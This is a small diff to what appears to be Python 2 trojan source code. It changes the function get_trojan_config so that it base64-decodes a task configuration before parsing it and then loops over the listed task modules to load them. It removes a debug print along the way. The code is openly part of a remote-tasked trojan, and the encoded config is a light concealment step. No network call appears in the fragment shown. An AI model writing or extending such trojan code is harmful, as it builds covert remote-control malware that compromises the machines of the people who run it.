@@ -65,9 +65,7 @@ def get_file_contents(filepath):
 def get_trojan_config():
 	global configured
 	config_json = get_file_contents(trojan_config)#This loads correctly
-	print config_json
-	#config = json.loads(base64.b64decode(config_json))
-	config = json.loads(config_json)
+	config = json.loads(base64.b64decode(config_json))
 	configured = True
 	for task in config:
 		if task['module'] not in sys.modules:
